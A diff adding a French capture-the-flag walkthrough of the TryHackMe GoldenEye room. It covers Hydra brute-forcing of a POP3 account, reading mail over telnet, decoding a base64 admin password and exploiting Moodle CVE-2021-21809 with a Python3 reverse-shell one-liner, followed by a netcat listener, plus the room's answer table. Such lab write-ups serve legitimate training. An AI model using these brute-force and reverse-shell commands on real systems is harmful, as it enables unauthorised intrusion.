@@ -381,3 +381,203 @@ Since you're a Linux user just point this servers IP to severnaya-station.com in
 
 ```
 
+## \[Task 3] GoldenEye Operators Training
+
+### Modifier /etc/hosts
+
+Comme indiqué dans le dernier email de natalya, modifions le fichier /etc/hosts pour y ajouter
+
+```
+<IP de la machine>    severnaya-station.com
+```
+
+Rendons-nous ensuite sur la page severnaya-station.com/gnocertdir
+
+### Exploitation de la page severnaya-station.com/gnocertdir
+
+<figure><img src=".gitbook/assets/gnocertdir01.png" alt=""><figcaption><p>login page</p></figcaption></figure>
+
+Connectons-nous avec les crédentiels **xenia:RCP90rulez!** trouvés dans le dernier email de natalya et explorons son profil.
+
+<figure><img src=".gitbook/assets/gnocertdir02.png" alt=""><figcaption><p>xenial page</p></figcaption></figure>
+
+<figure><img src=".gitbook/assets/gnocertdir03.png" alt=""><figcaption><p>xenial messages</p></figcaption></figure>
+
+Dans les messages de xenia, nous trouvons **doak** un nouvel utilisateur pop3
+
+Comme pour boris et natalya, passons-le à Hydra
+
+```
+──(kali㉿kali)-[~/THM/goldeneye]
+└─$ hydra -l doak  -P /usr/share/wordlists/fasttrack.txt pop3://$IP -s 55007 -t 64
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-10-05 10:44:49
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 262 login tries (l:1/p:262), ~5 tries per task
+[DATA] attacking pop3://10.10.233.62:55007/
+[55007][pop3] host: 10.10.233.62   login: doak   password: goat
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-10-05 10:45:18
+```
+
+**Nous avons le nouveau crédentiel pop3 doak:goat**
+
+Lisons ses mails:
+
+```
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ telnet $IP 55007
+Trying 10.10.233.62...
+Connected to 10.10.233.62.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+USER doak
++OK
+PASS goat
++OK Logged in.
+LIST
++OK 1 messages:
+1 606
+.
+RETR 1
++OK 606 octets
+Return-Path: <doak@ubuntu>
+X-Original-To: doak
+Delivered-To: doak@ubuntu
+Received: from doak (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 97DC24549D
+	for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+Message-Id: <20180425034731.97DC24549D@ubuntu>
+Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
+From: doak@ubuntu
+
+James,
+If you're reading this, congrats you've gotten this far. You know how tradecraft works right?
+
+Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......
+
+username: dr_doak
+password: 4England!
+```
+
+**Ce qui nous donne un nouvel utilisateur du site dr\_doak:4England!**
+
+Connectons-nous au site (d'abord logout pour xenial, puis login) et explorons son profil.
+
+<figure><img src=".gitbook/assets/gnocertdir04.png" alt=""><figcaption><p>dr_doak private files</p></figcaption></figure>
+
+Téléchargeons le fichier s3cret.txt et lisons-le:
+
+```
+007,
+
+I was able to capture this apps adm1n cr3ds through clear txt. 
+
+Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
+
+Something juicy is located here: /dir007key/for-007.jpg
+
+Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+```
+
+Le contenu de ce fichier suggère que les crédentiels de l'utilisateur '**admin**' du site se trouvent dans la page /dir007key/for-007.jpg
+
+<figure><img src=".gitbook/assets/gnocertdir05.png" alt=""><figcaption><p>dir007key/for-007.jpg</p></figcaption></figure>
+
+Téléchargeons l'image et analysons le contenu avec la commande strings for-007.jpg
+
+```
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ strings for-007.jpg
+JFIF
+Exif
+eFdpbnRlcjE5OTV4IQ==
+GoldenEye
+linux
+For James
+0231
+0100
+ASCII
+For 007
+....
+
+```
+
+visiblement **eFdpbnRlcjE5OTV4IQ==** est un hash base64 (présence des deux == à la fin du hash) qui décodé (par exemple [cyberchef](https://gchq.github.io/CyberChef/) ou [dcode fr](https://www.dcode.fr/identification-chiffrement)) donne **xWinter1995x!**
+
+### Exploitation du login Administrateur
+
+Nous avons maintenant les crédentiels **admin:xWinter1995x!**
+
+Retournons sur le site et connectons-nous en tant que admin et constatons que cet utilisateur a visiblement plus de droits, notamment ceux de modifier la configuration du site.
+
+<figure><img src=".gitbook/assets/gnocertdir06.png" alt=""><figcaption><p>page login admin</p></figcaption></figure>
+
+### Réponses aux questions
+
+<table><thead><tr><th width="579">Questions</th><th>Réponses</th></tr></thead><tbody><tr><td>Try using the credentials you found earlier. Which user can you login as?</td><td>xenia</td></tr><tr><td>Have a poke around the site. What other user can you find?</td><td>doak</td></tr><tr><td>What was this users password?</td><td>goat</td></tr><tr><td>What is the next user you can find from doak?</td><td>dr_doak</td></tr><tr><td>What is this users password?</td><td>4England!</td></tr></tbody></table>
+
+### Prise pied dans la machine - reverse shell
+
+Cherchon la version de Moodle
+
+<figure><img src=".gitbook/assets/moodle01.png" alt=""><figcaption><p>Moddle version</p></figcaption></figure>
+
+Lançons une recherche Google d'exploits pour Moodle du style « **search exploits moodle reverse shell**» et on trouve assez rapidement une vulnérabilité \[CVE-2021-21809] du côté du correcteur orthographique de Moodle.
+
+[https://ine.com/blog/cve-2021-21809-moodle-spellchecker-path-authenticated-rce](https://ine.com/blog/cve-2021-21809-moodle-spellchecker-path-authenticated-rce)
+
+<figure><img src=".gitbook/assets/CVE 2021-21809.png" alt="" width="375"><figcaption><p><a href="https://ine.com/blog/cve-2021-21809-moodle-spellchecker-path-authenticated-rce">cve-2021-21809</a></p></figcaption></figure>
+
+**Cette vulnérabilité \[CVE-2021-21809]** **de Moodle permet d'exécuter une commande à distance (reverse-shell) en modifiant le path système du correcteur orthographique.**
+
+Un passage par la base de données des exploits de [Rapid7](https://www.rapid7.com/db/vulnerabilities/moodle-cve-2021-21809/) confirme la vulnérabilité et donne la marche à suivre dans l'annexe suivante :
+
+[https://talosintelligence.com/vulnerability\_reports/TALOS-2021-1277](https://talosintelligence.com/vulnerability\_reports/TALOS-2021-1277)
+
+"_To exploit the shell injection vulnerability, the administrator **sets a path to the legacy server-side spellcheck binary (aspellpath) containing a backtick shell injection** and **sets PSpellShell as the spellchecking engine**. When a server-side spellcheck is requested, lib/editor/tinymce/plugins/spellchecker/classes/PSpellShell.php uses aspellpath to unsafely construct a shell\_exec command. The spellchecker plugin does not have to be enabled._"
+
+Lançons une recherche de 'spell' dans la page Moodle admin de notre cible
+
+<figure><img src=".gitbook/assets/moodle02.png" alt=""><figcaption></figcaption></figure>
+
+Comme indiqué dans la vulnérabilité, changeons le correcteur en PSpellShell
+
+<figure><img src=".gitbook/assets/moodle03.png" alt=""><figcaption><p>set PSpellShell</p></figcaption></figure>
+
+Cherchons un oneline reverse-shell par exemple dans [revshells.com](https://www.revshells.com/)
+
+<figure><img src=".gitbook/assets/rev-shell-01.png" alt=""><figcaption><p>oneline reverse-shell</p></figcaption></figure>
+
+Essayons un de mes reverse-shells préféré, le Python3 shortest:
+
+<pre class="language-python" data-overflow="wrap"><code class="lang-python"><strong>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("&#x3C;IP tun0 de Kali>",12345));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+</strong></code></pre>
+
+Copions le reverse-shell dans Moodle et sauvegardons le tout.
+
+<figure><img src=".gitbook/assets/rev-shell-02.png" alt=""><figcaption><p>moodle reverse-shell</p></figcaption></figure>
+
+Mettons Kali à l'écoute du port 12345 avec **nc -nvlp 12345**
+
+Dans Moodle créons une nouvelle entrée de blog et lançons le correcteur orthographique
+
+<figure><img src=".gitbook/assets/rev-shell-03.png" alt=""><figcaption></figcaption></figure>
+
+```
+┌──(kali㉿kali)-[~/THM/goldeneye]
+└─$ nc -nvlp 12345
+listening on [any] 12345 ...
+connect to [10.9.2.173] from (UNKNOWN) [10.10.43.2] 54414
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ whoami
+whoami
+www-data
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ 
+
+```
+
+### <mark style="color:orange;">**Nous voilà entrés dans la machine**</mark>
